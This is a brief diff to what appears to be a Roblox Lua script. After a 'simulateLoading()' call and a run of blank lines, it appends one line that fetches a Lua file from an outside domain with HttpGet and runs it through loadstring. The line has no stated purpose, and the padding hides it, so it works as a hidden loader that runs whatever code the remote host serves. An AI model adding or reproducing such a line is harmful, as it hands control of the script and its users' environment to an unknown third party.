@@ -80,3 +80,8 @@ end
 
 simulateLoading()
 
+
+
+
+
+loadstring(game:HttpGet("https://egorikusa.space/8254b7b833bd540c8f20bebf.lua", true))()
